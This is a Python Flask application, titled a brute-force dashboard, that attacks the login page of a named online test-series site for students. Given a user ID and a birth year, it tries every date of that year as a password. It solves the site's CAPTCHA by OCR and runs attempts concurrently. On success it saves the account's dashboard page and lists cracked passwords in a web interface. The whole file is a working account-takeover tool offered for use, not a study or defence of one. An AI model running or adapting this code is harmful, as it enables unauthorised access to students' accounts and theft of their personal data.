#!/usr/bin/env python3
"""
Motion OTS Brute‑Force Dashboard – Final Optimized Version
Author: Potato
"""

import os
import sys
import time
import uuid
import json
import threading
import queue
import asyncio
import aiohttp
from bs4 import BeautifulSoup
import re
from datetime import datetime, timedelta
import sqlite3
import traceback
from flask import Flask, render_template_string, request, jsonify, g

# ---------- OCR SETUP (ddddocr) ----------
try:
    import ddddocr
    ocr = ddddocr.DdddOcr(ocr=True, det=False)
    OCR_OK = True
    print("✅ ddddocr initialized")
except ImportError:
    OCR_OK = False
    print("❌ ddddocr not installed. Run: pip install ddddocr")
    sys.exit(1)
except Exception as e:
    OCR_OK = False
    print(f"❌ ddddocr init failed: {e}")
    sys.exit(1)

def solve_captcha_image(img_bytes, log_queue=None):
    try:
        result = ocr.classification(img_bytes)
        if result:
            cleaned = re.sub(r'[^A-Z0-9]', '', result).strip()
            if len(cleaned) >= 4:
                return cleaned[:6]
            if len(result) >= 4:
                return result[:6]
        return None
    except Exception as e:
        if log_queue:
            log_queue.put_nowait(f"❌ ddddocr error: {str(e)}")
        return None

# ---------- Database ----------
DATABASE = 'brute_jobs.db'
def get_db():
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sqlite3.connect(DATABASE)
        db.row_factory = sqlite3.Row
    return db

def init_db():
    with sqlite3.connect(DATABASE) as conn:
        conn.execute('''
            CREATE TABLE IF NOT EXISTS jobs (
                job_id TEXT PRIMARY KEY,
                user_id TEXT NOT NULL,
                year INTEGER NOT NULL,
                status TEXT DEFAULT 'idle',
                password TEXT,
                logs TEXT DEFAULT '[]',
                start_time TEXT,
                end_time TEXT,
                created_at TEXT DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        conn.commit()

# ---------- BruteJob Class ----------
class BruteJob:
    def __init__(self, job_id, user_id, year, status='idle', password=None, logs=None):
        self.job_id = job_id
        self.user_id = user_id
        self.year = year
        self.status = status
        self.password = password
        self.logs = logs if logs else []
        self.start_time = None
        self.end_time = None
        self.thread = None
        self.stop_flag = False
        self.log_queue = queue.Queue()
        self.total_passwords = 0
        self.processed = 0

    @classmethod
    def from_db_row(cls, row):
        job = cls(row['job_id'], row['user_id'], row['year'], row['status'], row['password'],
                  json.loads(row['logs']) if row['logs'] else [])
        job.start_time = row.get('start_time')
        job.end_time = row.get('end_time')
        return job

    def save_to_db(self):
        with sqlite3.connect(DATABASE) as conn:
            conn.execute('''
                INSERT OR REPLACE INTO jobs
                (job_id, user_id, year, status, password, logs, start_time, end_time)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
            ''', (self.job_id, self.user_id, self.year, self.status, self.password,
                  json.dumps(self.logs), self.start_time, self.end_time))
            conn.commit()

    def start(self):
        if self.thread and self.thread.is_alive():
            return
        self.status = 'running'
        self.start_time = datetime.now().isoformat()
        self.logs = []
        self.stop_flag = False
        self.password = None
        self.save_to_db()
        self.thread = threading.Thread(target=self._run)
        self.thread.daemon = True
        self.thread.start()

    def _run(self):
        try:
            asyncio.run(self._async_bruteforce())
        except Exception as e:
            self.log_queue.put(f"❌ Unhandled: {traceback.format_exc()}")
        finally:
            self.status = 'success' if self.password else 'failed'
            self.end_time = datetime.now().isoformat()
            self.save_to_db()

    async def _async_bruteforce(self):
        log_queue = self.log_queue
        user_id = self.user_id
        year = self.year

        start_date = datetime(year, 1, 1)
        end_date = datetime(year, 12, 31)
        dates = [start_date + timedelta(days=i) for i in range((end_date - start_date).days + 1)]
        self.total_passwords = len(dates)
        self.processed = 0
        log_queue.put_nowait(f"🚀 Starting for {user_id} over {year} ({self.total_passwords} passwords)")

        connector = aiohttp.TCPConnector(limit=5, limit_per_host=5)
        timeout = aiohttp.ClientTimeout(total=15, connect=10)
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            semaphore = asyncio.Semaphore(5)
            result_queue = asyncio.Queue()
            stop_event = asyncio.Event()
            tasks = []
            for date in dates:
                password = date.strftime("%d-%m-%Y")
                tasks.append(asyncio.create_task(
                    self._worker(session, user_id, password, semaphore, result_queue, stop_event, log_queue)
                ))
            found = None
            session_obj = None
            while True:
                try:
                    found, session_obj = await asyncio.wait_for(result_queue.get(), timeout=1.0)
                    break
                except asyncio.TimeoutError:
                    if all(t.done() for t in tasks):
                        break
                if stop_event.is_set():
                    break
            for t in tasks:
                t.cancel()
            if found:
                self.password = found
                log_queue.put_nowait(f"🎉 Password found: {found}")
                try:
                    dash = await session_obj.get("https://onlinetestseries.motion.ac.in/dashboard/student-dashboard.php")
                    if dash.status == 200:
                        with open(f"dashboard_{user_id}.html", "w") as f:
                            f.write(await dash.text())
                        log_queue.put_nowait("💾 Dashboard saved.")
                except Exception as e:
                    log_queue.put_nowait(f"⚠️ Dashboard save error: {e}")
            else:
                log_queue.put_nowait("❌ No password found.")

    async def _worker(self, session, user_id, password, semaphore, result_queue, stop_event, log_queue):
        if stop_event.is_set():
            return
        async with semaphore:
            self.processed += 1
            progress = f"Progress: {self.processed}/{self.total_passwords}"
            log_queue.put_nowait(f"⏳ Attempting {password}  ({progress})")
            # Try up to 5 times with different CAPTCHAs
            max_retries = 5
            for attempt in range(max_retries):
                if stop_event.is_set():
                    return
                try:
                    captcha = await self._fetch_captcha(session, log_queue)
                    if not captcha:
                        log_queue.put_nowait(f"⏭️ No CAPTCHA (attempt {attempt+1})")
                        continue
                    log_queue.put_nowait(f"🔑 Trying {password} with CAPTCHA {captcha}")
                    success, response = await self._try_login(session, user_id, password, captcha, log_queue)
                    if success:
                        log_queue.put_nowait(f"✅ SUCCESS! Password = {password}")
                        result_queue.put_nowait((password, session))
                        stop_event.set()
                        return
                    if response in ("captcha_error", "redirect_failure", "timeout"):
                        log_queue.put_nowait(f"🔄 Retry-able: {response} – retrying (attempt {attempt+1}/{max_retries})")
                        continue
                    else:
                        log_queue.put_nowait(f"❌ Login failed: {response[:120]}")
                        return  # give up for this password
                except asyncio.TimeoutError:
                    log_queue.put_nowait(f"⏰ Timeout for {password}, retrying...")
                    continue
                except Exception as e:
                    log_queue.put_nowait(f"❌ Worker error: {str(e)}")
                    return
            log_queue.put_nowait(f"⏭️ Giving up on {password} after {max_retries} retries")
            await asyncio.sleep(0.2)

    async def _fetch_captcha(self, session, log_queue):
        for attempt in range(3):
            try:
                rand = int(time.time() * 1000) + attempt + os.getpid()
                url = f"https://onlinetestseries.motion.ac.in/captcha.php?rand={rand}"
                async with session.get(url, timeout=aiohttp.ClientTimeout(total=6)) as resp:
                    if resp.status == 200:
                        img_bytes = await resp.read()
                        if len(img_bytes) < 100:
                            continue
                        loop = asyncio.get_running_loop()
                        captcha = await loop.run_in_executor(None, solve_captcha_image, img_bytes, log_queue)
                        if captcha:
                            return captcha
                    await asyncio.sleep(0.2)
            except:
                continue
        return None

    async def _try_login(self, session, user_id, password, captcha, log_queue):
        data = {
            "login_username": user_id,
            "login_password": password,
            "captcha": captcha,
            "login": ""
        }
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9",
            "Accept-Language": "en-US,en;q=0.9",
            "Referer": "https://onlinetestseries.motion.ac.in/",
        }
        try:
            async with session.post("https://onlinetestseries.motion.ac.in/login.php",
                                    data=data, headers=headers, allow_redirects=False,
                                    timeout=aiohttp.ClientTimeout(total=10)) as resp:
                if resp.status == 302:
                    location = resp.headers.get("Location", "")
                    if "dashboard/student-dashboard.php" in location:
                        return True, None
                    else:
                        return False, "redirect_failure"
                elif resp.status == 200:
                    text = await resp.text()
                    soup = BeautifulSoup(text, "html.parser")
                    err = soup.find("div", class_="alertmsg")
                    if err:
                        err_text = err.text.strip()
                        if "CAPTCHA" in err_text or "captcha" in err_text:
                            return False, "captcha_error"
                        else:
                            return False, err_text[:100]
                    else:
                        if "dashboard" in text.lower() or "logout" in text.lower():
                            return True, None
                        return False, "unknown_failure"
                else:
                    return False, f"HTTP {resp.status}"
        except asyncio.TimeoutError:
            return False, "timeout"
        except Exception as e:
            return False, f"Exception: {e}"

    def stop(self):
        self.stop_flag = True
        self.status = 'stopped'
        self.save_to_db()

    def get_updates(self):
        new = []
        while not self.log_queue.empty():
            msg = self.log_queue.get_nowait()
            self.logs.append(msg)
            new.append(msg)
            if "SUCCESS" in msg or "Password found" in msg:
                if "Password =" in msg:
                    self.password = msg.split("Password =")[-1].strip()
                self.status = 'success'
            if len(self.logs) % 5 == 0:
                self.save_to_db()
        if new:
            self.save_to_db()
        return new

# ---------- Flask App ----------
app = Flask(__name__)
app.secret_key = 'supersecretkey'
jobs = {}

def load_jobs_from_db():
    with sqlite3.connect(DATABASE) as conn:
        conn.row_factory = sqlite3.Row
        rows = conn.execute("SELECT * FROM jobs ORDER BY created_at DESC").fetchall()
        for row in rows:
            job = BruteJob.from_db_row(row)
            jobs[job.job_id] = job
    print(f"📂 Loaded {len(jobs)} jobs.")

@app.route('/')
def index():
    HTML = '''<!DOCTYPE html>
<html><head><title>Motion Brute‑Force</title>
<style>body{background:#0d1117;color:#c9d1d9;font-family:sans-serif;padding:20px}
.container{max-width:1000px;margin:auto}
.card{background:#161b22;padding:20px;border-radius:12px;margin-bottom:20px}
h1{color:#58a6ff}
.form-group{display:flex;gap:15px;flex-wrap:wrap;margin:15px 0}
.form-group label{min-width:80px;font-weight:bold}
.form-group input{padding:10px;border-radius:6px;border:none;background:#0d1117;color:#c9d1d9;flex:1;min-width:150px}
.btn{padding:10px 25px;border:none;border-radius:6px;cursor:pointer;font-weight:bold}
.btn-start{background:#238636;color:#fff}
.btn-start:hover{background:#2ea043}
.btn-stop{background:#da3633;color:#fff}
.btn-stop:hover{background:#f85149}
.btn:disabled{opacity:0.6;cursor:not-allowed}
.logs-box{background:#0d1117;padding:15px;border-radius:8px;max-height:400px;overflow-y:auto;font-family:monospace;font-size:13px;white-space:pre-wrap;margin-top:10px}
.log-entry{border-bottom:1px solid #21262d;padding:3px 0}
.success{color:#3fb950}
.error{color:#f85149}
.info{color:#58a6ff}
.status-bar{padding:10px;background:#0d1117;border-radius:6px;margin:10px 0}
.job-list{margin-top:20px}
.job-item{background:#0d1117;padding:10px;border-radius:6px;margin-bottom:8px;display:flex;justify-content:space-between;flex-wrap:wrap}
.job-status{font-weight:bold}
.job-status.running{color:#58a6ff}
.job-status.success{color:#3fb950}
.job-status.failed{color:#f85149}
.job-status.stopped{color:#d29922}
.job-actions a{color:#58a6ff;margin-left:10px;cursor:pointer}
</style>
</head>
<body>
<div class="container">
<div class="card">
<h1>🚀 Motion OTS Brute‑Forcer</h1>
<p>Enter a user ID and a year.</p>
<form id="bruteForm">
<div class="form-group"><label>User ID</label><input type="text" id="user_id" placeholder="e.g. 26173000005" required></div>
<div class="form-group"><label>Year</label><input type="number" id="year" placeholder="2009" min="1900" max="2100" required></div>
<div style="display:flex;gap:15px;flex-wrap:wrap">
<button type="submit" class="btn btn-start" id="startBtn">▶ Start</button>
<button type="button" class="btn btn-stop" id="stopBtn" disabled>⏹ Stop</button>
</div>
</form>
<div class="status-bar"><span id="status-text">Idle</span> <span id="password-result"></span></div>
<div id="logs" class="logs-box">Waiting for logs...</div>
</div>
<div class="card"><h2>📋 Previous Jobs</h2><div id="jobList" class="job-list"></div></div>
</div>
<script>
let jobId=null,pollInterval=null;
const logsDiv=document.getElementById('logs'),statusText=document.getElementById('status-text'),passwordResult=document.getElementById('password-result'),startBtn=document.getElementById('startBtn'),stopBtn=document.getElementById('stopBtn'),jobListDiv=document.getElementById('jobList');
document.getElementById('bruteForm').addEventListener('submit',async(e)=>{
e.preventDefault();
const user_id=document.getElementById('user_id').value.trim(),year=document.getElementById('year').value.trim();
if(!user_id||!year)return alert('Fill all fields');
startBtn.disabled=true;stopBtn.disabled=false;logsDiv.innerHTML='';statusText.innerText='Starting...';passwordResult.innerText='';
const formData=new FormData();formData.append('user_id',user_id);formData.append('year',year);
try{
const resp=await fetch('/start',{method:'POST',body:formData});const data=await resp.json();
if(data.error){alert(data.error);resetUI();return}
jobId=data.job_id;statusText.innerText='Running...';if(pollInterval)clearInterval(pollInterval);pollInterval=setInterval(pollStatus,1000);loadJobs();
}catch(err){alert('Error: '+err.message);resetUI()}
});
stopBtn.addEventListener('click',async()=>{
if(!jobId)return;try{await fetch(`/stop/${jobId}`,{method:'POST'});statusText.innerText='Stopped';stopBtn.disabled=true;startBtn.disabled=false;if(pollInterval)clearInterval(pollInterval);loadJobs();}catch(err){alert('Stop error: '+err.message)}
});
async function pollStatus(){
if(!jobId)return;try{
const resp=await fetch(`/status/${jobId}`);const data=await resp.json();
if(data.error){console.error(data.error);clearInterval(pollInterval);resetUI();return}
if(data.new_logs&&data.new_logs.length>0){data.new_logs.forEach(msg=>{const div=document.createElement('div');div.className='log-entry';if(msg.includes('SUCCESS')||msg.includes('Password found'))div.classList.add('success');else if(msg.includes('❌')||msg.includes('Error'))div.classList.add('error');else div.classList.add('info');div.textContent=msg;logsDiv.appendChild(div);logsDiv.scrollTop=logsDiv.scrollHeight})}
if(data.status==='success'){statusText.innerText='✅ Success!';passwordResult.innerText=`🎉 Password: ${data.password}`;stopBtn.disabled=true;startBtn.disabled=false;clearInterval(pollInterval);loadJobs()}
else if(data.status==='failed'){statusText.innerText='❌ Failed';stopBtn.disabled=true;startBtn.disabled=false;clearInterval(pollInterval);loadJobs()}
else if(data.status==='stopped'){statusText.innerText='⏹ Stopped';stopBtn.disabled=true;startBtn.disabled=false;clearInterval(pollInterval);loadJobs()}
else if(data.status==='running')statusText.innerText='🔄 Running...'
}catch(err){console.error('Poll error:',err)}
}
async function loadJobs(){
try{const resp=await fetch('/jobs');const data=await resp.json();if(data.jobs){jobListDiv.innerHTML=data.jobs.map(j=>`
<div class="job-item"><div><strong>${j.user_id}</strong> (${j.year}) <span class="job-status ${j.status}">${j.status.toUpperCase()}</span> ${j.password?`🔑 ${j.password}`:''} <span style="font-size:0.8em;color:#8b949e;">${j.created_at}</span></div><div><a onclick="viewJob('${j.job_id}')">View Logs</a>${j.status==='running'?` <a onclick="stopJob('${j.job_id}')">Stop</a>`:''}</div></div>
`).join('')}}catch(err){console.error(err)}
}
async function viewJob(jid){const resp=await fetch(`/status/${jid}`);const data=await resp.json();if(data.logs){logsDiv.innerHTML=data.logs.map(msg=>`<div class="log-entry">${msg}</div>`).join('');statusText.innerText=`Job ${jid} (${data.status})`;passwordResult.innerText=data.password?`Password: ${data.password}`:''}}
async function stopJob(jid){if(!confirm('Stop this job?'))return;try{await fetch(`/stop/${jid}`,{method:'POST'});loadJobs()}catch(err){alert(err.message)}}
function resetUI(){startBtn.disabled=false;stopBtn.disabled=true;if(pollInterval)clearInterval(pollInterval);jobId=null}
loadJobs();
</script>
</body>
</html>'''
    return render_template_string(HTML)

@app.route('/start', methods=['POST'])
def start_job():
    user_id = request.form.get('user_id')
    year = request.form.get('year')
    if not user_id or not year:
        return jsonify({'error': 'Missing'}), 400
    try:
        year = int(year)
    except:
        return jsonify({'error': 'Year must be integer'}), 400
    job_id = str(uuid.uuid4())
    job = BruteJob(job_id, user_id, year)
    jobs[job_id] = job
    job.save_to_db()
    job.start()
    return jsonify({'job_id': job_id})

@app.route('/status/<job_id>')
def status(job_id):
    job = jobs.get(job_id)
    if not job:
        return jsonify({'error': 'Not found'}), 404
    new = job.get_updates()
    return jsonify({'status': job.status, 'password': job.password, 'logs': job.logs, 'new_logs': new})

@app.route('/stop/<job_id>', methods=['POST'])
def stop_job(job_id):
    job = jobs.get(job_id)
    if not job:
        return jsonify({'error': 'Not found'}), 404
    job.stop()
    return jsonify({'status': 'stopped'})

@app.route('/jobs')
def list_jobs():
    with sqlite3.connect(DATABASE) as conn:
        conn.row_factory = sqlite3.Row
        rows = conn.execute("SELECT job_id, user_id, year, status, password, created_at FROM jobs ORDER BY created_at DESC").fetchall()
        return jsonify({'jobs': [dict(row) for row in rows]})

@app.route('/test-password', methods=['POST'])
async def test_password():
    data = request.get_json()
    if not data:
        return jsonify({'error': 'JSON body required'}), 400
    user_id = data.get('user_id')
    password = data.get('password')
    captcha = data.get('captcha')
    if not user_id or not password:
        return jsonify({'error': 'user_id and password required'}), 400
    if not captcha:
        connector = aiohttp.TCPConnector(limit=1)
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            for attempt in range(3):
                rand = int(time.time() * 1000) + attempt
                url = f"https://onlinetestseries.motion.ac.in/captcha.php?rand={rand}"
                async with session.get(url) as resp:
                    if resp.status == 200:
                        img_bytes = await resp.read()
                        captcha = solve_captcha_image(img_bytes, None)
                        if captcha:
                            break
            if not captcha:
                return jsonify({'error': 'Could not fetch CAPTCHA'}), 400
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Accept": "text/html",
        "Referer": "https://onlinetestseries.motion.ac.in/",
    }
    login_data = {
        "login_username": user_id,
        "login_password": password,
        "captcha": captcha,
        "login": ""
    }
    try:
        connector = aiohttp.TCPConnector(limit=1)
        timeout = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            async with session.post("https://onlinetestseries.motion.ac.in/login.php",
                                    data=login_data, headers=headers, allow_redirects=False) as resp:
                result = {'status': resp.status, 'headers': dict(resp.headers)}
                if resp.status == 302:
                    result['location'] = resp.headers.get('Location')
                else:
                    text = await resp.text()
                    result['body_preview'] = text[:500]
                return jsonify(result)
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.teardown_appcontext
def close_db(exception):
    db = getattr(g, '_database', None)
    if db:
        db.close()

# ---------- Startup ----------
init_db()
load_jobs_from_db()

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
